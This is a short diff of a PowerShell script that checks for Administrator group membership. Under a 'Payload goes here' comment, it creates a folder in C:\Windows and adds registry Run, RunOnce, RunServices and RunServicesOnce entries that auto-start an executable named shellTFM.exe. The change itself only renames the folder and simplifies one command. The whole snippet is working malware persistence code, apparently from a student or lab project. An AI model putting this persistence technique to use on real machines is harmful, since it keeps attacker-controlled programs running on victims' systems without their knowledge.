@@ -1,8 +1,8 @@
 if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
     #Payload goes here
     #It'll run as Administrator
-    mkdir C:\Windows\prueba;
-    cmd.exe /c reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v TFM /t REG_SZ /d "C:\Users\User\Documents\shellTFM.exe";
+    mkdir C:\Windows\prueba2;
+    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v TFM /t REG_SZ /d "C:\Users\User\Documents\shellTFM.exe";
     cmd.exe /c reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v TFM /t REG_SZ /d "C:\Users\User\Documents\shellTFM.exe";
     cmd.exe /c reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v TFM /t REG_SZ /d "C:\Users\User\Documents\shellTFM.exe";
     cmd.exe /c reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v TFM /t REG_SZ /d "C:\Users\User\Documents\shellTFM.exe";
